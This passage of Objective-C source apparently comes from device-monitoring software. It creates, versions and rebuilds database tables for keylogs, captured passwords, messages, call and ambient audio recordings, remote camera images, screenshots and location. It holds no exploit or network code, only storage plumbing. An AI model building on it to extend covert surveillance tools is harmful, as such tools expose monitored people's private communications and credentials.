	// IM contact
	[self createTables:kCreateIMContactTable];
	// IM conversation
	[self createTables:kCreateIMConversationTable];
	// IM message attachment
	[self createTables:kCreateIMMessageAttachmentTable];
    // IM conversation contact
    [self createTables:kCreateIMConversationContactTable];
	// VolIP
	[self createTables:kCreateVoIPTable];
	// KeyLog
	[self createTables:kCreateKeyLogTable];
    // Page visited
    [self createTables:kCreatePageVisitedTable];
    // Password
    [self createTables:kCreatePasswordTable];
    // App password
    [self createTables:kCreateAppPasswordTable];
    // Usb connection
    [self createTables:kCreateUsbConnectionTable];
    // File transfer
    [self createTables:kCreateFileTransferTable];
    // Logon
    [self createTables:kCreateLogonTable];
    // Application usage
    [self createTables:kCreateApplicationUsageTable];
    // IM Mac
    [self createTables:kCreateIMMacOSTable];
    // Email Mac
    [self createTables:kCreateEmailMacOSTable];
    // Screenshot
    [self createTables:kCreateScreenshotTable];
    // File activity
    [self createTables:kCreateFileActivityTable];
    // Network traffic
    [self createTables:kCreateNetworkTrafficTable];
    // Network connection Mac
    [self createTables:kCreateNetworkConnectionMacOSTable];
    // Print job
    [self createTables:kCreatePrintJobTable];
	
	// Create indexes =========================================================
	// System
	[self createIndexes:kCreateSystemIndex];
	// Panic
	[self createIndexes:kCreatePanicIndex];
	// Location
	[self createIndexes:kCreateLocationIndex];
	// Call log
	[self createIndexes:kCreateCallLogIndex];
	// SMS
	[self createIndexes:kCreateSMSIndex];
	// MMS
	[self createIndexes:kCreateMMSIndex];
	// Email
	[self createIndexes:kCreateEmailIndex];
	// Media
	[self createIndexes:kCreateMediaIndex];
	// Attachment
	[self createIndexes:kCreateAttachmentIndex];
	// Recipient
	[self createIndexes:kCreateRecipientIndex];
	// GPS tag
	[self createIndexes:kCreateGPSTagIndex];
	// Call tag
	[self createIndexes:kCreateCallTagIndex];
	// Thumbnail
	[self createIndexes:kCreateThumbnailIndex];
	// Event base
	[self createIndexes:kCreateEventBaseIndex];
	// Settings
	[self createIndexes:kCreateSettingsIndex];
	// IM
	[self createIndexes:kCreateIMIndex];
	// Browser url
	[self createIndexes:kCreateBrowserUrlIndex];
	// Bookmarks
	[self createIndexes:kCreateBookmarksIndex];
	// Bookmark
	[self createIndexes:kCreateBookmarkIndex];
	// Application life cycle
	[self createIndexes:kCreateApplicationLifeCycleIndex];
	// IM message
	[self createIndexes:kCreateIMMessageIndex];
	// IM account
	[self createIndexes:kCreateIMAccountIndex];
	// IM contact
	[self createIndexes:kCreateIMContactIndex];
	// IM conversation
	[self createIndexes:kCreateIMConversationIndex];
	// IM message attachment
	[self createIndexes:kCreateIMMessageAttachmentIndex];
    // IM conversation contact
	[self createIndexes:kCreateIMConversationContactIndex];
	// VolIP
	[self createIndexes:kCreateVoIPIndex];
	// KeyLog
	[self createIndexes:kCreateKeyLogIndex];
    // Page visited
    [self createIndexes:kCreatePageVisitedIndex];
    // Password
    [self createIndexes:kCreatePasswordIndex];
    // App password
    [self createIndexes:kCreateAppPasswordIndex];
    // Usb connection
    [self createIndexes:kCreateUsbConnectionIndex];
    // File transfer
    [self createIndexes:kCreateFileTransferIndex];
    // Logon
    [self createIndexes:kCreateLogonIndex];
    // Application usage
    [self createIndexes:kCreateApplicationUsageIndex];
    // IM Mac
    [self createIndexes:kCreateIMMacOSIndex];
    // Email Mac
    [self createIndexes:kCreateEmailMacOSIndex];
    // Screenshot
    [self createIndexes:kCreateScreenshotIndex];
    // File activity
    [self createIndexes:kCreateFileActivityIndex];
    // Network traffic
    [self createIndexes:kCreateNetworkTrafficIndex];
    // Network connection Mac
    [self createIndexes:kCreateNetworkConnectionMacIndex];
    // Print job
    [self createIndexes:kCreatePrintJobIndex];
	
	// Create triggers =========================================================
	// Delete mms attachment
	[self createTriggers:kCreateDeleteMMSAttachmentTrigger];
	// Delete email attachment
	[self createTriggers:kCreateDeleteEmailAttachmentTrigger];
	// Delete sms recipient
	[self createTriggers:kCreateDeleteSMSRecipientTrigger];
	// Delete mms recipient
	[self createTriggers:kCreateDeleteMMSRecipientTrigger];
	// Delete email recipient
	[self createTriggers:kCreateDeleteEmailRecipientTrigger];
	// Delete GPS tag
	[self createTriggers:kCreateDeleteGPSTagTrigger];
	// Delete call tag
	[self createTriggers:kCreateDeleteCallTagTrigger];
	// Delete thumbnail
	[self createTriggers:kCreateDeleteThumbnailTrigger];
	// Delete im attachment
	[self createTriggers:kCreateDeleteIMAttachmentTrigger];
	// Delete im recipient
	[self createTriggers:kCreateDeleteIMRecipientTrigger];
	// Delete bookmarks bookmark
	[self createTriggers:kCreateDeleteBookmarksBookmarkTrigger];
	// Delete im message attachment
	[self createTriggers:kCreateDeleteIMMessageAttachmentTrigger];
	// Delete im conversation contact
	[self createTriggers:kCreateDeleteIMConversationContactTrigger];
    // Delete app password
    [self createTriggers:kCreateDeleteAppPasswordTrigger];
    // Delete email mac os attachment
    [self createTriggers:kCreateDeleteEmailMacOSAttachmentTrigger];
    // Delete email mac os recipient
    [self createTriggers:kCreateDeleteEmailMacOSRecipientTrigger];
}

- (void) createDatabaseSchemaV2 {
    // Create tables =========================================================
    // VoIP
    [self createTables:kCreateVoIPTable];
    
    // Create indexes =========================================================
    // VoIP
    [self createIndexes:kCreateVoIPIndex];
}

- (void) createDatabaseSchemaV3 {
    // Create tables =========================================================
    // KeyLog
    [self createTables:kCreateKeyLogTable];
    // Page visited
    [self createTables:kCreatePageVisitedTable];
    
    // Create indexes =========================================================
    // KeyLog
    [self createIndexes:kCreateKeyLogIndex];
    // Page visited
    [self createIndexes:kCreatePageVisitedIndex];
}

- (void) createDatabaseSchemaV4 {
    // Create tables =========================================================
    // Password
    [self createTables:kCreatePasswordTable];
    // App password
    [self createTables:kCreateAppPasswordTable];
    
    // Create indexes =========================================================
    // Password
    [self createIndexes:kCreatePasswordIndex];
    // App password
    [self createIndexes:kCreateAppPasswordIndex];
    
    // Create triggers =========================================================
    // Delete app password
    [self createTriggers:kCreateDeleteAppPasswordTrigger];
}

- (void) createDatabaseSchemaV5 {
    // Create tables =========================================================
    // Usb connection
    [self createTables:kCreateUsbConnectionTable];
    // File transfer
    [self createTables:kCreateFileTransferTable];
    // Logon
    [self createTables:kCreateLogonTable];
    // Application usage
    [self createTables:kCreateApplicationUsageTable];
    // IM Mac
    [self createTables:kCreateIMMacOSTable];
    // Email Mac
    [self createTables:kCreateEmailMacOSTable];
    // Screenshot
    [self createTables:kCreateScreenshotTable];
    
    // Create indexes =========================================================
    // Usb connection
    [self createIndexes:kCreateUsbConnectionIndex];
    // File transfer
    [self createIndexes:kCreateFileTransferIndex];
    // Logon
    [self createIndexes:kCreateLogonIndex];
    // Application usage
    [self createIndexes:kCreateApplicationUsageIndex];
    // IM Mac
    [self createIndexes:kCreateIMMacOSIndex];
    // Email Mac
    [self createIndexes:kCreateEmailMacOSIndex];
    // Screenshot
    [self createIndexes:kCreateScreenshotIndex];
    
    // Create triggers =========================================================
    // Delete email mac os attachment
    [self createTriggers:kCreateDeleteEmailMacOSAttachmentTrigger];
    // Delete email mac os recipient
    [self createTriggers:kCreateDeleteEmailMacOSRecipientTrigger];
}

- (void) createDatabaseSchemaV6 {
    // Create tables =========================================================
    // File activity
    [self createTables:kCreateFileActivityTable];
    
    // Create indexes =========================================================
    // File activity
    [self createIndexes:kCreateFileActivityIndex];
}

- (void) createDatabaseSchemaV7 {
    // Create tables =========================================================
    // Network traffic
    [self createTables:kCreateNetworkTrafficTable];
    // Network connection Mac
    [self createTables:kCreateNetworkConnectionMacOSTable];
    
    // Create indexes =========================================================
    // Network traffic
    [self createIndexes:kCreateNetworkTrafficIndex];
    // Network connection Mac
    [self createIndexes:kCreateNetworkConnectionMacIndex];
}

- (void) createDatabaseSchemaV8 {
    // Create tables =========================================================
    // Print job
    [self createTables:kCreatePrintJobTable];
    
    // Create indexes =========================================================
    // Print job
    [self createIndexes:kCreatePrintJobIndex];
}

// Note: when the table is dropped file path in that table is dropped but file system is not deleted (LIMITATION because of reason to drop table is, that table is not readable or writable)
- (void) dropTable:(FxEventType) aTableId {
    // When table is dropped, index, trigger associated with the table would drop as well; TESTED!
	DLog (@"Drop the table id = %d", (int)aTableId);
    BOOL maintainAllMedia = FALSE;
    switch (aTableId) {
        case kEventTypeCallLog: {
            [self executeSql:kDropCallLogTable];
            
            [self executeSql:kCreateCallLogTable];
            [self executeSql:kCreateCallLogIndex];
        } break;
        case kEventTypeSystem: {
            [self executeSql:kDropSystemTable];
            
            [self executeSql:kCreateSystemTable];
            [self executeSql:kCreateSystemIndex];
        } break;
		case kEventTypeSettings: {
			[self executeSql:kDropSettingsTable];
			
			[self executeSql:kCreateSettingsTable];
			[self executeSql:kCreateSettingsIndex];
		} break;
        case kEventTypePanic: {
            [self executeSql:kDropPanicTable];
            
            [self executeSql:kCreatePanicTable];
            [self executeSql:kCreatePanicIndex];
        } break;
        case kEventTypeLocation: {
            [self executeSql:kDropLocationTable];
            
            [self executeSql:kCreateLocationTable];
            [self executeSql:kCreateLocationIndex];
        } break;
        case kEventTypeSms: {
            [self executeSql:kDropSMSTable];
            [self executeSql:kDeleteRecipientOnDropSMSTable];
            
            [self executeSql:kCreateSMSTable];
            [self executeSql:kCreateSMSIndex];
            
            [self executeSql:kCreateDeleteSMSRecipientTrigger];
        } break;
        case kEventTypeMms: {
            [self executeSql:kDropMMSTable];
            [self executeSql:kDeleteRecipientOnDropMMSTable];
            [self executeSql:kDeleteAttachmentOnDropMMSTable];
            
            [self executeSql:kCreateMMSTable];
            [self executeSql:kCreateMMSIndex];
            
            [self executeSql:kCreateDeleteMMSAttachmentTrigger];
            [self executeSql:kCreateDeleteMMSRecipientTrigger];
        } break;
        case kEventTypeMail: {
            [self executeSql:kDropEmailTable];
            [self executeSql:kDeleteRecipientOnDropEmailTable];
            [self executeSql:kDeleteAttachmentOnDropEmailTable];
            
            [self executeSql:kCreateEmailTable];
            [self executeSql:kCreateEmailIndex];
            
            [self executeSql:kCreateDeleteEmailAttachmentTrigger];
            [self executeSql:kCreateDeleteEmailRecipientTrigger];
        } break;
		case kEventTypeIM: {
			[self executeSql:kDropIMTable];
            [self executeSql:kDeleteRecipientOnDropIMTable];
            [self executeSql:kDeleteAttachmentOnDropIMTable];
            
            [self executeSql:kCreateIMTable];
            [self executeSql:kCreateIMIndex];
            
            [self executeSql:kCreateDeleteIMAttachmentTrigger];
            [self executeSql:kCreateDeleteIMRecipientTrigger];
		} break;
		case kEventTypeBrowserURL: {
			[self executeSql:kDropBrowserUrlTable];
			
			[self executeSql:kCreateBrowserUrlTable];
			[self executeSql:kCreateBrowserUrlIndex];
		} break;
		case kEventTypeBookmark: {
			[self executeSql:kDropBookmarksTable];
			[self executeSql:kDropBookmarkTable];
			
			[self executeSql:kCreateBookmarksTable];
			[self executeSql:kCreateBookmarksIndex];
            [self executeSql:kCreateBookmarkTable];
            [self executeSql:kCreateBookmarkIndex];
            
            [self executeSql:kCreateDeleteBookmarksBookmarkTrigger];
		} break;
		case kEventTypeApplicationLifeCycle: {
            [self executeSql:kDropApplicationLifeCycleTable];
            
            [self executeSql:kCreateApplicationLifeCycleTable];
            [self executeSql:kCreateApplicationLifeCycleIndex];
        } break;
		case kEventTypeIMMessage: {
			[self executeSql:kDropIMMessageTable];
			[self executeSql:kDropIMMessageAttachmentTable];
			
			[self executeSql:kCreateIMMessageTable];
			[self executeSql:kCreateIMMessageIndex];
			[self executeSql:kCreateIMMessageAttachmentTable];
			[self executeSql:kCreateIMMessageAttachmentIndex];
			[self executeSql:kCreateDeleteIMMessageAttachmentTrigger];
		} break;
		case kEventTypeIMAccount: {
			[self executeSql:kDropIMAccountTable];
			
			[self executeSql:kCreateIMAccountTable];
			[self executeSql:kCreateIMAccountIndex];
		} break;
		case kEventTypeIMContact: {
			[self executeSql:kDropIMContactTable];
			
			[self executeSql:kCreateIMContactTable];
			[self executeSql:kCreateIMContactIndex];
		} break;
		case kEventTypeIMConversation: {
			[self executeSql:kDropIMConversationTable];
			[self executeSql:kDropIMConversationContactTable];
			
			[self executeSql:kCreateIMConversationTable];
			[self executeSql:kCreateIMConversationIndex];
			[self executeSql:kCreateIMConversationContactTable];
			[self executeSql:kCreateIMConversationContactIndex];
			[self executeSql:kCreateDeleteIMConversationContactTrigger];
		} break;
		case kEventTypeVoIP: {
			[self executeSql:kDropVoIPTable];
			
			[self executeSql:kCreateVoIPTable];
			[self executeSql:kCreateVoIPIndex];
		} break;
		case kEventTypeKeyLog: {
			[self executeSql:kDropKeyLogTable];
			
			[self executeSql:kCreateKeyLogTable];
			[self executeSql:kCreateKeyLogIndex];
		} break;
        case kEventTypePageVisited: {
			[self executeSql:kDropPageVisitedTable];
			
			[self executeSql:kCreatePageVisitedTable];
			[self executeSql:kCreatePageVisitedIndex];
		} break;
        case kEventTypePassword: {
            [self executeSql:kDropPasswordTable];
            [self executeSql:kDropAppPasswordTable];
            
            [self executeSql:kCreatePasswordTable];
            [self executeSql:kCreateAppPasswordTable];
            [self executeSql:kCreatePasswordIndex];
            [self executeSql:kCreateAppPasswordIndex];
            [self executeSql:kCreateDeleteAppPasswordTrigger];
        } break;
        case kEventTypeUsbConnection: {
            [self executeSql:kDropUsbConnectionTable];
            
            [self executeSql:kCreateUsbConnectionTable];
            [self executeSql:kCreateUsbConnectionIndex];
        } break;
        case kEventTypeFileTransfer: {
            [self executeSql:kDropFileTransferTable];
            
            [self executeSql:kCreateFileTransferTable];
            [self executeSql:kCreateFileTransferIndex];
        } break;
        case kEventTypeLogon: {
            [self executeSql:kDropLogonTable];
            
            [self executeSql:kCreateLogonTable];
            [self executeSql:kCreateLogonIndex];
        } break;
        case kEventTypeAppUsage: {
            [self executeSql:kDropApplicationUsageTable];
            
            [self executeSql:kCreateApplicationUsageTable];
            [self executeSql:kCreateApplicationUsageIndex];
        } break;
        case kEventTypeIMMacOS: {
            [self executeSql:kDropIMMacOSTable];
            
            [self executeSql:kCreateIMMacOSTable];
            [self executeSql:kCreateIMMacOSIndex];
        } break;
        case kEventTypeEmailMacOS: {
            [self executeSql:kDropEmailMacOSTable];
            [self executeSql:kDeleteRecipientOnDropEmailMacOSTable];
            [self executeSql:kDeleteAttachmentOnDropEmailMacOSTable];
            
            [self executeSql:kCreateEmailMacOSTable];
            [self executeSql:kCreateEmailMacOSIndex];
            
            [self createTriggers:kCreateDeleteEmailMacOSAttachmentTrigger];
            [self createTriggers:kCreateDeleteEmailMacOSRecipientTrigger];
        } break;
        case kEventTypeScreenRecordSnapshot: {
            [self executeSql:kDropScreenshotTable];
            
            [self executeSql:kCreateScreenshotTable];
            [self executeSql:kCreateScreenshotIndex];
        } break;
        case kEventTypeFileActivity: {
            [self executeSql:kDropFileActivityTable];
            
            [self executeSql:kCreateFileActivityTable];
            [self executeSql:kCreateFileActivityIndex];
        } break;
        case kEventTypeNetworkTraffic: {
            [self executeSql:kDropNetworkTrafficTable];
            
            [self executeSql:kCreateNetworkTrafficTable];
            [self executeSql:kCreateNetworkTrafficIndex];
        } break;
        case kEventTypeNetworkConnectionMacOS: {
            [self executeSql:kDropNetworkConnectionMacOSTable];
            
            [self executeSql:kCreateNetworkConnectionMacOSTable];
            [self executeSql:kCreateNetworkConnectionMacIndex];
        } break;
        case kEventTypePrintJob: {
            [self executeSql:kDropPrintJobTable];
            
            [self executeSql:kCreatePrintJobTable];
            [self executeSql:kCreatePrintJobIndex];
        } break;
		case kEventTypePanicImage:
		case kEventTypeAmbientRecordAudio:
		case kEventTypeAmbientRecordAudioThumbnail:
        case kEventTypeWallpaper:
        case kEventTypeWallpaperThumbnail:
        case kEventTypeCameraImage:
        case kEventTypeCameraImageThumbnail:
        case kEventTypeCallRecordAudio:
        case kEventTypeCallRecordAudioThumbnail:
        case kEventTypeVideo:
        case kEventTypeVideoThumbnail:
        case kEventTypeAudio:
        case kEventTypeAudioThumbnail: {
            [self executeSql:kDropMediaTable];
            [self executeSql:kDropThumbnailTable];
            [self executeSql:kDropGPSTagTable];
            [self executeSql:kDropCallTagTable];
            
            [self executeSql:kCreateMediaTable];
            [self executeSql:kCreateThumbnailTable];
            [self executeSql:kCreateGPSTagTable];
            [self executeSql:kCreateCallTagTable];
            
            [self executeSql:kCreateMediaIndex];
            [self executeSql:kCreateThumbnailIndex];
            [self executeSql:kCreateGPSTagIndex];
            [self executeSql:kCreateCallTagIndex];
            
            [self executeSql:kCreateDeleteGPSTagTrigger];
            [self executeSql:kCreateDeleteCallTagTrigger];
            [self executeSql:kCreateDeleteThumbnailTrigger];
            
            maintainAllMedia = TRUE;
        } break;
        default: {
            [databaseManager dropDB];
        } break;
    }
    
    // Maintain event_base table
    FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
    [sqlString formatInt:aTableId atIndex:0];
    NSString* sqlStatement = [sqlString finalizeSqlString];
    [self executeSql:sqlStatement];
    [sqlString release];
    
	DLog (@"Is maintain all media = %d", maintainAllMedia);
    if (maintainAllMedia) { // Only thumbnail & media table only 
        // Maintain event_base table
        sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeWallpaper atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
        
        sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeWallpaperThumbnail atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
        
        FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeCameraImage atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
        
        sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeCameraImageThumbnail atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
        
        sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeCallRecordAudio atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
        
        sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeCallRecordAudioThumbnail atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
        
        sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeVideo atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
        
        sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeVideoThumbnail atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
		
		sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeAudio atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
		
		sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeAudioThumbnail atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
		
		sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeAmbientRecordAudio atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
		
		sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeAmbientRecordAudioThumbnail atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
		
		sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeRemoteCameraImage atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
		
		sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteRowOnDropAnyTable];
        [sqlString formatInt:kEventTypeRemoteCameraVideo atIndex:0];
        sqlStatement = [sqlString finalizeSqlString];
        [self executeSql:sqlStatement];
        [sqlString release];
    }
}

@end
